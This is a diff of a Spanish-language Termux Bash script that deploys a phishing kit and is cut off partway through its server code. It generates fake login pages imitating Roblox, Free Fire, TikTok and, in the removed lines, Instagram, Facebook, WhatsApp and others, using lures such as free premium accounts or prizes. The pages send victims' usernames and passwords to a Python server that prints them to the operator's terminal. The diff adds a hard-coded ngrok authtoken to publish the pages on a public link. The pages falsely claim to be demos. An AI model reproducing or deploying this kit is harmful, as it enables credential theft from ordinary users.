@@ -19,9 +19,13 @@ echo "  ╚══════╝╚══════╝╚═╝  ╚═╝  �
 echo -e "${AMARILLO}        [ WEB SERVER DEPLOYER v3.0 ]${NC}\n"
 
 # ============================================
-# FUNCIONES HTML PARA CADA APP
+# CONFIGURACIÓN DE NGROK (TU TOKEN)
 # ============================================
+NGROK_TOKEN="3H0QmOvROuXni12KbiqkN8Ob0zL_3j7Gx8xUAU6DRjzLrfNMT"
 
+# ============================================
+# FUNCIONES HTML (MISMO CÓDIGO QUE ANTES)
+# ============================================
 html_roblox() {
 cat << 'EOF'
 <!DOCTYPE html>
@@ -85,7 +89,6 @@ function enviarDatos(e) {
     const usuario = document.getElementById('usuario').value;
     const password = document.getElementById('password').value;
     
-    // Enviar datos al servidor (Termux)
     fetch('/submit', {
         method: 'POST',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
@@ -104,6 +107,9 @@ function enviarDatos(e) {
 EOF
 }
 
+# ============================================
+# FUNCIONES HTML PARA LAS DEMÁS APPS
+# ============================================
 html_freefire() {
 cat << 'EOF'
 <!DOCTYPE html>
@@ -266,537 +272,6 @@ function enviarDatos(e) {
 EOF
 }
 
-html_instagram() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📸 Instagram - Verificación</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(45deg,#405de6,#833ab4);min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:rgba(255,255,255,0.95);padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(0,0,0,0.3);width:420px;text-align:center}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#333;font-size:28px;margin-bottom:8px}
-        .subtitle{color:#666;font-size:14px;margin-bottom:25px}
-        .offer-box{background:linear-gradient(45deg,#405de6,#833ab4);border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#fff;font-size:20px}
-        .offer-box p{color:#fff;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#333;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:15px;transition:all 0.3s}
-        .input-group input:focus{outline:none;border-color:#405de6;box-shadow:0 0 20px rgba(64,93,230,0.15)}
-        .btn{width:100%;padding:16px;background:linear-gradient(45deg,#405de6,#833ab4);border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(64,93,230,0.3)}
-        .footer{color:#999;margin-top:20px;font-size:11px;border-top:1px solid #eee;padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">📸</div>
-    <h1>¡VERIFICA TU CUENTA!</h1>
-    <p class="subtitle">Obtén el check azul oficial</p>
-    <div class="offer-box">
-        <h3>✅ VERIFICACIÓN OFICIAL</h3>
-        <p>Consigue el <span style="background:#ffd700;color:#000;padding:3px 12px;border-radius:20px;font-weight:bold;">✓ Verificado</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>👤 USUARIO DE INSTAGRAM</label>
-            <input type="text" id="usuario" placeholder="Ingresa tu usuario" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CONTRASEÑA</label>
-            <input type="password" id="password" placeholder="Ingresa tu contraseña" required>
-        </div>
-        <button type="submit" class="btn">✅ VERIFICAR CUENTA</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Tu solicitud de verificación ha sido enviada</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=Instagram&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-html_facebook() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>📘 Facebook - Inicio de Sesión</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:#f0f2f5;min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#fff;padding:40px;border-radius:15px;box-shadow:0 15px 50px rgba(0,0,0,0.1);width:420px;text-align:center}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#1877f2;font-size:32px;margin-bottom:8px;font-weight:bold}
-        .subtitle{color:#1c1e21;font-size:14px;margin-bottom:25px}
-        .offer-box{background:#f0f2f5;border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#1877f2;font-size:18px}
-        .offer-box p{color:#1c1e21;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#1c1e21;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:15px;transition:all 0.3s}
-        .input-group input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 20px rgba(24,119,242,0.15)}
-        .btn{width:100%;padding:16px;background:#1877f2;border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(24,119,242,0.3)}
-        .footer{color:#999;margin-top:20px;font-size:11px;border-top:1px solid #eee;padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">📘</div>
-    <h1>facebook</h1>
-    <p class="subtitle">Inicia sesión para reclamar tu premio</p>
-    <div class="offer-box">
-        <h3>🎁 SORTEO EXCLUSIVO</h3>
-        <p>Gana <span style="color:#1877f2;font-weight:bold;">$500 USD</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>📧 CORREO O TELÉFONO</label>
-            <input type="text" id="usuario" placeholder="Correo electrónico o número de teléfono" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CONTRASEÑA</label>
-            <input type="password" id="password" placeholder="Contraseña" required>
-        </div>
-        <button type="submit" class="btn">🔐 INICIAR SESIÓN</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Has sido registrado en el sorteo</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=Facebook&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-html_whatsapp() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💬 WhatsApp - Premium</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:#111b21;min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#202c33;padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(0,0,0,0.5);width:420px;text-align:center;border:1px solid rgba(0,168,132,0.2)}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#00a884;font-size:28px;margin-bottom:8px}
-        .subtitle{color:#e9edef;font-size:14px;margin-bottom:25px}
-        .offer-box{background:rgba(0,168,132,0.1);border:2px solid #00a884;border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#00a884;font-size:20px}
-        .offer-box p{color:#e9edef;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#e9edef;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:#2a3942;color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
-        .input-group input:focus{outline:none;background:#2a3942;border-color:#00a884;box-shadow:0 0 20px rgba(0,168,132,0.15)}
-        .input-group input::placeholder{color:#888}
-        .btn{width:100%;padding:16px;background:#00a884;border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(0,168,132,0.3)}
-        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">💬</div>
-    <h1>WHATSAPP GOLD</h1>
-    <p class="subtitle">Activa las funciones premium exclusivas</p>
-    <div class="offer-box">
-        <h3>⭐ PREMIUM GRATIS</h3>
-        <p style="color:#e9edef;">Accede a <span style="color:#00a884;font-weight:bold;">WhatsApp Gold</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>📱 NÚMERO DE TELÉFONO</label>
-            <input type="text" id="usuario" placeholder="Número de teléfono" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CÓDIGO DE VERIFICACIÓN</label>
-            <input type="password" id="password" placeholder="Código de verificación" required>
-        </div>
-        <button type="submit" class="btn">💬 ACTIVAR PREMIUM</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Has sido registrado en WhatsApp Gold</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=WhatsApp&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-html_youtube() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>▶️ YouTube - Premium Gratis</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:#0f0f0f;min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#212121;padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(255,0,0,0.2);width:420px;text-align:center;border:1px solid rgba(255,0,0,0.2)}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#ff0000;font-size:28px;margin-bottom:8px}
-        .subtitle{color:#ddd;font-size:14px;margin-bottom:25px}
-        .offer-box{background:rgba(255,0,0,0.05);border:2px solid #ff0000;border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#ff0000;font-size:20px}
-        .offer-box p{color:#ddd;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:#121212;color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
-        .input-group input:focus{outline:none;background:#121212;border-color:#ff0000;box-shadow:0 0 20px rgba(255,0,0,0.15)}
-        .input-group input::placeholder{color:#888}
-        .btn{width:100%;padding:16px;background:#ff0000;border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,0,0,0.3)}
-        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">▶️</div>
-    <h1>YOUTUBE PREMIUM</h1>
-    <p class="subtitle">Disfruta sin anuncios por 1 año</p>
-    <div class="offer-box">
-        <h3>🎁 PREMIUM GRATIS</h3>
-        <p style="color:#ddd;">Obtén <span style="color:#ff0000;font-weight:bold;">YouTube Premium</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>📧 CORREO DE GOOGLE</label>
-            <input type="text" id="usuario" placeholder="Correo de Google" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CONTRASEÑA</label>
-            <input type="password" id="password" placeholder="Contraseña" required>
-        </div>
-        <button type="submit" class="btn">▶️ ACTIVAR PREMIUM</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Has sido registrado en YouTube Premium</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=YouTube&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-html_minecraft() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>⛏️ Minecraft - Cuenta Premium</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Courier New',monospace;background:#1e1e1e;min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#2d2d2d;padding:40px;border-radius:15px;box-shadow:0 15px 50px rgba(124,252,0,0.2);width:420px;text-align:center;border:2px solid #7cfc00}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#7cfc00;font-size:28px;margin-bottom:8px}
-        .subtitle{color:#aaa;font-size:14px;margin-bottom:25px}
-        .offer-box{background:rgba(124,252,0,0.05);border:2px solid #7cfc00;border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#7cfc00;font-size:20px}
-        .offer-box p{color:#aaa;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:#1a1a1a;color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
-        .input-group input:focus{outline:none;background:#1a1a1a;border-color:#7cfc00;box-shadow:0 0 20px rgba(124,252,0,0.15)}
-        .input-group input::placeholder{color:#888}
-        .btn{width:100%;padding:16px;background:#7cfc00;border:none;border-radius:12px;color:#000;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(124,252,0,0.3)}
-        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">⛏️</div>
-    <h1>MINECRAFT PREMIUM</h1>
-    <p class="subtitle">Consigue tu cuenta premium gratis</p>
-    <div class="offer-box">
-        <h3>🎁 CUENTA PREMIUM</h3>
-        <p style="color:#aaa;">Obtén <span style="color:#7cfc00;font-weight:bold;">Minecraft Premium</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>📧 CORREO DE MICROSOFT</label>
-            <input type="text" id="usuario" placeholder="Correo de Microsoft" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CONTRASEÑA</label>
-            <input type="password" id="password" placeholder="Contraseña" required>
-        </div>
-        <button type="submit" class="btn">⛏️ OBTENER CUENTA</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Has sido registrado para Minecraft Premium</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=Minecraft&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-html_pubg() {
-cat << 'EOF'
-<!DOCTYPE html>
-<html lang="es">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔫 PUBG Mobile - UC Gratis</title>
-    <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:'Segoe UI',Arial,sans-serif;background:#1a1a1a;min-height:100vh;display:flex;justify-content:center;align-items:center}
-        .container{background:#262626;padding:40px;border-radius:25px;box-shadow:0 15px 50px rgba(255,107,0,0.2);width:420px;text-align:center;border:1px solid rgba(255,107,0,0.3)}
-        .logo{font-size:70px;margin-bottom:10px}
-        h1{color:#ff6b00;font-size:28px;margin-bottom:8px}
-        .subtitle{color:#aaa;font-size:14px;margin-bottom:25px}
-        .offer-box{background:rgba(255,107,0,0.05);border:2px solid #ff6b00;border-radius:15px;padding:20px;margin-bottom:25px}
-        .offer-box h3{color:#ff6b00;font-size:20px}
-        .offer-box p{color:#aaa;font-size:14px}
-        .input-group{margin-bottom:18px;text-align:left}
-        .input-group label{display:block;color:#ddd;margin-bottom:6px;font-weight:600;font-size:14px}
-        .input-group input{width:100%;padding:14px;border:none;border-radius:10px;background:#111;color:#fff;font-size:15px;transition:all 0.3s;border:1px solid transparent}
-        .input-group input:focus{outline:none;background:#111;border-color:#ff6b00;box-shadow:0 0 20px rgba(255,107,0,0.15)}
-        .input-group input::placeholder{color:#888}
-        .btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff6b00,#cc5500);border:none;border-radius:12px;color:#fff;font-size:18px;font-weight:bold;cursor:pointer;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}
-        .btn:hover{transform:translateY(-2px);box-shadow:0 10px 30px rgba(255,107,0,0.3)}
-        .footer{color:#666;margin-top:20px;font-size:11px;border-top:1px solid rgba(255,255,255,0.05);padding-top:15px}
-        .success{display:none;background:rgba(46,213,115,0.15);border:2px solid #2ed573;border-radius:12px;padding:20px;margin-top:20px;color:#2ed573}
-        .success.show{display:block}
-    </style>
-</head>
-<body>
-<div class="container">
-    <div class="logo">🔫</div>
-    <h1>PUBG MOBILE UC</h1>
-    <p class="subtitle">Consigue 8100 UC gratis</p>
-    <div class="offer-box">
-        <h3>🎁 EVENTO UC</h3>
-        <p style="color:#aaa;">Gana <span style="color:#ff6b00;font-weight:bold;">8,100 UC</span></p>
-    </div>
-    <form id="formData" onsubmit="enviarDatos(event)">
-        <div class="input-group">
-            <label>🎯 ID DE JUGADOR</label>
-            <input type="text" id="usuario" placeholder="ID de jugador" required>
-        </div>
-        <div class="input-group">
-            <label>🔑 CONTRASEÑA</label>
-            <input type="password" id="password" placeholder="Contraseña" required>
-        </div>
-        <button type="submit" class="btn">💎 OBTENER UC</button>
-    </form>
-    <div class="success" id="successMsg">
-        ✅ ¡DATOS ENVIADOS CORRECTAMENTE!<br>
-        <span style="font-size:12px">Has sido registrado para el evento UC</span>
-    </div>
-    <p class="footer">⚠️ Este es un sitio de demostración - No almacenamos datos reales</p>
-</div>
-<script>
-function enviarDatos(e) {
-    e.preventDefault();
-    const usuario = document.getElementById('usuario').value;
-    const password = document.getElementById('password').value;
-    
-    fetch('/submit', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-        body: 'app=PUBG&usuario=' + encodeURIComponent(usuario) + '&password=' + encodeURIComponent(password)
-    });
-    
-    document.getElementById('successMsg').classList.add('show');
-    document.getElementById('formData').reset();
-    setTimeout(() => {
-        document.getElementById('successMsg').classList.remove('show');
-    }, 5000);
-}
-</script>
-</body>
-</html>
-EOF
-}
-
-# ============================================
-# SERVIDOR HTTP CON PYTHON PARA RECIBIR DATOS
-# ============================================
-start_server() {
-    cd ~/mi_web
-    python3 << 'PYTHON_SCRIPT'
-import http.server
-import socketserver
-import urllib.parse
-import datetime
-
-PORT = 8080
-
-class MyHandler(http.server.SimpleHTTPRequestHandler):
-    def do_POST(self):
-        if self.path == '/submit':
-            content_length = int(self.headers['Content-Length'])
-            post_data = self.rfile.read(content_length)
-            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
-            
-            app = data.get('app', ['Desconocido'])[0]
-            usuario = data.get('usuario', [''])[0]
-            password = data.get('password', [''])[0]
-            
-            print("\n" + "="*50)
-            print("📥 NUEVOS DATOS RECIBIDOS")
-            print("="*50)
-            print(f"📱 App: {app}")
-            print(f"👤 Usuario: {usuario}")
-            print(f"🔑 Contraseña: {password}")
-            print(f"🕐 Hora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-            print("="*50 + "\n")
-            
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(b'{"status":"ok"}')
-        else:
-            self.send_response(404)
-            self.end_headers()
-    
-    def do_GET(self):
-        if self.path == '/':
-            self.path = '/index.html'
-        return http.server.SimpleHTTPRequestHandler.do_GET(self)
-
-print("🚀 Servidor iniciado en el puerto 8080")
-print("📡 Esperando datos...")
-with socketserver.TCPServer(("", PORT), MyHandler) as httpd:
-    httpd.serve_forever()
-PYTHON_SCRIPT
-}
-
 # ============================================
 # FUNCIÓN PARA OBTENER HTML SEGÚN APP
 # ============================================
@@ -806,13 +281,30 @@ get_html() {
         "Roblox") html_roblox ;;
         "Free Fire") html_freefire ;;
         "TikTok") html_tiktok ;;
-        "Facebook") html_facebook ;;
-        "Instagram") html_instagram ;;
-        "WhatsApp") html_whatsapp ;;
-        "YouTube") html_youtube ;;
-        "Minecraft") html_minecraft ;;
-        "PUBG Mobile") html_pubg ;;
-        *) echo "Aplicación no soportada" ;;
+        *) 
+            echo '<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Servidor</title>
+<style>
+body{font-family:Arial;background:linear-gradient(135deg,#667eea,#764ba2);color:#fff;text-align:center;padding:50px}
+.container{background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;max-width:400px;margin:auto}
+input{width:100%;padding:12px;margin:10px 0;border-radius:8px;border:none}
+.btn{background:rgba(255,255,255,0.2);border:2px solid #fff;padding:12px 30px;border-radius:8px;color:#fff;font-weight:bold;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="container">
+<h1>🚀 '$app'</h1>
+<p>Servidor activo</p>
+<form onsubmit="fetch('/submit',{method:"POST",body:"app='$app'&usuario="+encodeURIComponent(document.getElementById("u").value)+"&password="+encodeURIComponent(document.getElementById("p").value)});alert("✅ Datos enviados");return false;">
+<input type="text" id="u" placeholder="Usuario" required>
+<input type="password" id="p" placeholder="Contraseña" required>
+<button class="btn">Enviar</button>
+</form>
+</div>
+</body>
+</html>'
+            ;;
     esac
 }
 
@@ -821,8 +313,7 @@ get_html() {
 # ============================================
 
 APPS=(
-    "Roblox" "Free Fire" "TikTok" "Facebook" "Instagram"
-    "WhatsApp" "YouTube" "Minecraft" "PUBG Mobile"
+    "Roblox" "Free Fire" "TikTok"
 )
 
 echo -e "${BLANCO}[+] Módulos disponibles (${#APPS[@]} en total):${NC}\n"
@@ -866,9 +357,10 @@ HTML_CONTENT=$(get_html "$SELECTED_APP")
 echo "$HTML_CONTENT" > ~/mi_web/index.html
 
 # ============================================
-# INSTALAR PYTHON SI NO ESTÁ INSTALADO
+# INSTALAR DEPENDENCIAS
 # ============================================
 pkg install python -y > /dev/null 2>&1
+pkg install ngrok -y > /dev/null 2>&1
 
 clear
 echo -e "${CYAN}==================================================${NC}"
@@ -876,19 +368,40 @@ echo -e "${VERDE}[✔] SERVIDOR DESPLEGADO PARA: ${BLANCO}$SELECTED_APP${NC}"
 echo -e "${CYAN}==================================================${NC}\n"
 
 # ============================================
-# MOSTRAR ENLACES SEGÚN OPCIÓN
+# LIBERAR PUERTO 8080
 # ============================================
+echo -e "${AMARILLO}[*] Liberando puerto 8080...${NC}"
+fuser -k 8080/tcp 2>/dev/null
+pkill -f "python3.*http.server" 2>/dev/null
+pkill -f ngrok 2>/dev/null
+sleep 2
+
+# ============================================
+# CONFIGURAR TOKEN DE NGROK
+# ============================================
+echo -e "${AMARILLO}[*] Configurando ngrok...${NC}"
+ngrok config add-authtoken $NGROK_TOKEN 2>/dev/null
+
+# ============================================
+# INICIAR SERVIDOR EN SEGUNDO PLANO
+# ============================================
+cd ~/mi_web
+python3 -m http.server 8080 &
+SERVER_PID=$!
+sleep 2
+
+# ============================================
+# INICIAR NGROK (SI SE SELECCIONÓ PÚBLICO)
+# ============================================
+NGROK_URL=""
 if [ "$net_choice" == "2" ]; then
-    # INSTALAR NGROK Y OBTENER LINK PÚBLICO
     echo -e "${AMARILLO}[*] Generando enlace público con Ngrok...${NC}"
-    pkg install ngrok -y > /dev/null 2>&1
-    
-    # Iniciar ngrok en segundo plano
     ngrok http 8080 > /dev/null 2>&1 &
-    sleep 4
+    NGROK_PID=$!
+    sleep 6
     
     # Obtener el link de ngrok
-    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io')
+    NGROK_URL=$(curl -s http://localhost:4040/api/tunnels 2>/dev/null | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io' | head -1)
     
     echo -e "${BLANCO}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
     echo -e "${VERDE}🌐 ENLACE PÚBLICO (MUNDIAL):${NC}"
@@ -922,6 +435,54 @@ echo -e "${VERDE}📥 Los datos enviados aparecerán en esta terminal${NC}"
 echo -e "${BLANCO}Presiona Ctrl+C para detener el servidor.${NC}\n"
 
 # ============================================
-# INICIAR SERVIDOR CON PYTHON
+# SERVIDOR QUE RECIBE DATOS POST
 # ============================================
-start_server
+python3 << 'PYTHON_SCRIPT'
+import http.server
+import socketserver
+import urllib.parse
+import datetime
+import json
+import os
+
+PORT = 8080
+
+class DataHandler(http.server.SimpleHTTPRequestHandler):
+    def do_POST(self):
+        if self.path == '/submit':
+            content_length = int(self.headers.get('Content-Length', 0))
+            post_data = self.rfile.read(content_length)
+            data = urllib.parse.parse_qs(post_data.decode('utf-8'))
+            
+            app = data.get('app', ['Desconocido'])[0]
+            usuario = data.get('usuario', [''])[0]
+            password = data.get('password', [''])[0]
+            
+            print("\n" + "="*50)
+            print("📥 NUEVOS DATOS RECIBIDOS")
+            print("="*50)
+            print(f"📱 App: {app}")
+            print(f"👤 Usuario: {usuario}")
+            print(f"🔑 Contraseña: {password}")
+            print(f"🕐 Hora: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+            print("="*50 + "\n")
+            
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(json.dumps({'status': 'ok'}).encode())
+        else:
+            self.send_response(404)
+            self.end_headers()
+    
+    def do_GET(self):
+        if self.path == '/':
